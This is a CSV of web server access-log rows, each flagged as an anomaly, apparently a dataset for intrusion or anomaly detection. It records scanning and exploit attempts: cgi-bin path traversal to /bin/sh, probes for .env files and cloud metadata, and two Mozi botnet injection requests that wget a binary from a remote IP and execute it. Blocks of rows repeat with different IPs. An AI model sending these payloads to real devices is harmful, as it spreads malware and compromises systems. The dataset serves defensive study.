ip,date,method,endpoint,status,size,flag
247.209.18.156,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
25.242.197.89,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
144.1.185.50,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
49.210.229.66,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
241.202.235.202,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
236.11.231.43,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
207.91.133.151,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
239.22.114.224,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
46.188.5.88,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
190.145.196.59,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
190.29.187.69,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
151.182.128.125,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
240.236.204.63,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
100.190.8.220,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
27.198.38.47,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
180.213.128.53,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
238.137.249.70,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
81.219.124.112,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
149.12.14.109,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
58.58.144.41,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
70.70.114.14,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
36.134.166.222,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
240.85.62.136,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
149.94.30.218,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
217.48.145.174,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
95.211.7.216,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
197.191.205.54,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
38.123.19.164,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
148.189.42.160,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
187.138.80.213,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
124.6.70.16,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
201.154.237.110,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
228.10.174.118,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
116.206.154.156,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
77.50.29.253,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
125.87.150.169,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
172.142.11.32,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
24.85.127.69,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
91.181.5.250,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
151.9.32.82,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
156.107.251.177,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
90.181.29.212,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
1.71.77.8,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
67.130.152.138,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
252.32.248.114,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
2.239.93.215,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
200.104.95.18,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
47.111.109.246,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
68.203.241.200,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
81.132.0.144,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
39.202.102.210,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
27.135.159.152,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
194.32.33.17,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
192.235.90.231,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
131.192.81.141,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
6.152.198.253,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
85.101.168.22,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
41.235.226.118,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
29.126.235.83,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
98.54.137.79,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
213.91.16.208,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
101.36.171.251,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
93.128.117.23,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
234.49.163.26,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
144.12.114.241,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
27.61.20.24,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
71.120.25.161,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
252.71.0.74,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
108.52.221.46,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
21.1.67.189,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
40.3.5.69,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
80.211.99.71,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
83.86.77.130,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
250.167.70.209,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
182.224.108.163,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
72.161.208.200,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
19.94.69.226,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
52.160.146.105,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
38.8.132.8,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
145.232.188.197,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
63.72.65.92,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
133.83.40.142,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
9.123.83.5,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
92.41.158.115,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
189.205.81.26,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
3.23.191.26,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
197.173.50.128,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
66.42.162.178,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
201.215.195.249,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
160.153.182.206,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
31.108.52.115,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
163.82.179.253,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
93.38.149.252,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
186.187.213.225,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
50.4.121.160,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
153.176.231.184,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
84.162.160.55,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
154.69.18.108,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
161.221.254.3,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
231.35.56.11,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
219.55.239.144,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
4.47.211.190,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
150.211.59.66,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
83.64.190.31,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
197.201.133.11,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
19.156.205.5,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
80.46.19.161,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
202.236.30.91,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
254.52.123.217,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
146.36.225.170,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
140.103.191.215,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
29.104.144.1,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
13.222.216.182,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
72.189.72.190,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
58.238.200.18,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
148.168.250.242,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
195.130.72.168,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
74.104.6.232,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
126.87.198.238,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
188.149.236.19,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
219.20.92.214,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
56.18.95.104,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
69.132.98.153,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
170.35.174.108,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
142.116.55.50,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
69.122.186.128,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
197.2.105.203,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
250.96.0.193,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
169.47.118.57,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
70.128.120.4,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
71.178.210.109,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
178.144.32.165,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
117.93.121.123,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
216.153.101.123,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
45.221.11.47,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
73.160.102.101,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
149.24.54.238,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
161.81.236.153,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
46.209.203.100,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
191.80.32.165,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
117.155.199.90,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
157.153.156.2,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
167.111.241.86,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
88.52.233.33,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
214.86.196.52,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
35.151.55.25,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
163.191.241.65,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
81.23.114.10,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
82.55.249.53,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
173.206.15.233,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
29.50.143.193,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
199.151.45.48,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
180.44.241.162,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
141.69.154.14,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
132.5.246.106,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
223.171.236.76,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
10.73.171.9,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
62.126.77.98,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
253.165.161.178,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
97.66.52.163,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
29.86.123.14,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
251.90.15.72,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
113.8.110.238,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
206.52.191.66,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
243.218.127.142,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
26.218.82.17,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
59.41.62.22,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
29.90.21.137,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
244.111.154.114,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
4.223.26.243,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
42.98.157.47,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
225.247.211.138,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
44.124.230.98,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
50.79.227.204,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
189.205.166.228,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
191.65.130.68,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
83.118.124.197,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
252.56.123.197,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
115.12.37.12,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
43.190.20.211,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
75.9.30.5,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
132.252.37.162,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
95.214.45.178,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
84.23.133.101,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
113.209.202.172,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
252.97.79.92,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
143.128.247.185,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
131.158.84.206,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
202.146.240.59,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
107.21.143.29,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
56.115.39.0,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
16.48.228.232,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
71.2.96.83,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
65.126.246.6,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
238.189.236.247,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
30.193.71.252,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
237.94.243.227,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
27.126.112.88,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
135.207.62.111,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
42.85.27.107,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
208.92.175.80,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
234.194.231.137,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
84.16.144.237,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
121.155.27.58,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
120.132.245.213,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
30.227.110.12,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
213.34.235.244,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
236.227.152.177,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
77.97.234.142,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
221.246.155.145,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
140.150.153.176,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
39.135.36.2,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
235.105.140.53,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
107.182.122.116,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
142.105.108.160,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
250.249.32.52,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
147.195.61.68,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
5.68.88.235,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
129.39.219.202,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
235.141.222.104,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
167.112.169.105,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
251.169.59.252,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
187.231.129.181,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
35.50.240.158,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
46.117.164.232,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
24.186.219.114,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
56.226.233.222,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
51.148.181.93,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
178.205.217.80,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
204.66.97.81,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
28.238.131.199,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
155.232.168.109,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
52.114.232.65,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
19.112.191.67,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
42.29.176.94,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
198.53.89.15,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
56.19.137.107,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
126.216.105.104,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
174.63.7.26,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
81.155.44.174,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
30.193.150.84,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
9.95.45.205,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
42.217.6.14,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
169.5.64.117,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
86.116.241.215,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
71.71.29.17,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
73.40.218.7,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
74.136.29.148,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
209.241.189.86,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
80.37.89.96,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
76.178.75.211,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
